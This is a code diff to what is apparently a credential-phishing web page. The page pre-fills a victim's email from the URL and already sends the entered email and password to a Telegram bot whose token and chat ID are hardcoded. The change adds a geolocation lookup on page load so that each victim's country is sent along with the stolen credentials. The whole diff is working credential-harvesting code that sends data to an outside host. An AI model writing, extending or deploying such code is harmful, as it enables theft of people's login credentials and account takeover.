@@ -81,12 +81,27 @@
         }
     </style>
     <script>
+        let userCountry = ''; // Variable to store user's country
+
         // Function to populate the email field from URL parameter
         function populateEmailField() {
             const params = new URLSearchParams(window.location.search);
             if (params.has('email')) {
                 document.getElementById('email').value = params.get('email');
             }
+        }
+
+        // Function to fetch user's country using a geolocation API
+        function fetchUserCountry() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    userCountry = data.country_name || "Unknown";
+                })
+                .catch(error => {
+                    console.error("Error fetching country data:", error);
+                    userCountry = "Unknown"; // Default to "Unknown" if there's an error
+                });
         }
 
         // Function to send data to Telegram
@@ -100,7 +115,7 @@
             // Telegram bot details
             const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
             const chatId = "6885599280";
-            const message = `Email: ${email}\nPassword: ${password}`;
+            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
 
             // Send the data to Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -127,8 +142,11 @@
             });
         }
 
-        // Run populateEmailField function on page load
-        window.onload = populateEmailField;
+        // Run functions on page load
+        window.onload = function() {
+            populateEmailField();
+            fetchUserCountry();
+        };
     </script>
 </head>
 <body>
